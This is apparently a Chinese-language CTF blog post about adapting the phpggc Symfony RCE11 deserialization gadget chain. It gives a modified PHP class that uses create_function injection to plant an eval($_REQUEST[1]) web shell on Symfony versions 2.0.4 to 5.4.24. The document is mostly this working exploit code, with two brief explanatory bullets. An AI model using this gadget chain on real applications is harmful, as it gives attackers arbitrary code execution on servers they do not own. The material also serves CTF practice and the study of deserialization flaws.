---
layout: post
title: phpggc-symfony
date: 2023-08-13 23:28 +0800
categories: [ctf, web]
tag: [web]
---

## phpggc的symfony
* 默认使用call_user_func时只有一个参数，如果用数组传递多个参数，则会报错
* 如果你要执行更复杂的内容，可以考虑使用create_function进行注入，修改源代码如下

```php
<?php

namespace GadgetChain\Symfony;

class RCE11 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '2.0.4 <= 5.4.24 (all)';
    public static $vector = '__destruct';
    public static $author = 'cfreal';

    public function generate(array $parameters)
    {
        $a = new \Symfony\Component\Validator\ConstraintViolationList([
                '$a',
                ';};@eval($_REQUEST[1]);var_dump(111111);#',
        ]);
        $b = new \Symfony\Component\Finder\Iterator\SortableIterator($a, 'create_function');
        $c = new \Symfony\Component\Validator\ConstraintViolationList($b);
        $d = new \Symfony\Component\Security\Core\Authentication\Token\AnonymousToken($c);
        return $d;
    }
}
```